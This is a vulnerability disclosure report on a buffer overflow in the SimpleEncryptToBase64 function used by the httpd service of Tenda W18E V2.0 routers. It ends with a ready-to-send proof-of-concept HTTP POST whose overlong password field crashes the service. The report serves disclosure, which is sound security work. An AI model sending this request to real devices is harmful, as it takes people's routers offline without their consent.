# Information

**Vendor of the products:** Shenzhen Tenda Technology Co.,Ltd.

**Vendor's website:** https://www.tenda.com.cn/

**Reported by:** He Nan(zikh26@qq.com)，Guan Qing Wen(2144987805@qq.com)

**Affected products:** W18E V2.0

**Affected firmware version:** V16.01.0.11

**Firmware download address:** [W18E V2.0](https://tenda.com.cn/material/show/103863)

# Overview

In the `Tenda-W18E V2.0` device, a buffer overflow vulnerability exists in the `SimpleEncryptToBase64` function defined in the `libcommonprod.so` library. This function is invoked by the `httpd` process with user-controllable parameters, allowing an attacker to craft a specially designed packet that causes the `httpd` process to crash, resulting in a denial-of-service (DoS) condition.

# Vulnerability details

The handler function `formSetAccountList` is registered in the `common_register` function.

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250223203736762.png" alt="image-20250223203736762" style="zoom:50%;" />

After parsing the `password` field, the `SimpleEncryptToBase64` function is called on line 35 with it as an argument.

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250223203814927.png" alt="image-20250223203814927" style="zoom:50%;" />



The `SimpleEncryptToBase64` function is defined in the `libcommonprod.so` library. On line 16, it uses `strlen` to get the length of the `password` and mistakenly uses this length as the third argument of the `strncpy` function. Since the `password` field is of variable length, while the buffer `v17` (the second argument of `SimpleEncryptToBase64`) has a fixed size, a sufficiently long `password` can cause a buffer overflow during the `strncpy` operation.

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250223204219811.png" alt="image-20250223204219811" style="zoom:50%;" />



# Poc

```
POST /goform/setModules HTTP/1.1
Host: 192.168.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/plain, */*
Cookie: bLanguage=cn; sessionid=W18EV2:0.146.4:52e768
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html?v=2044
Content-Length: 108

{"account":[{"userType": "admin", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;", "remark": "", "loginIP": "", "ID": 1, "action": "edit"}]}
```

![image-20250329153426074](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250329153426074.png)

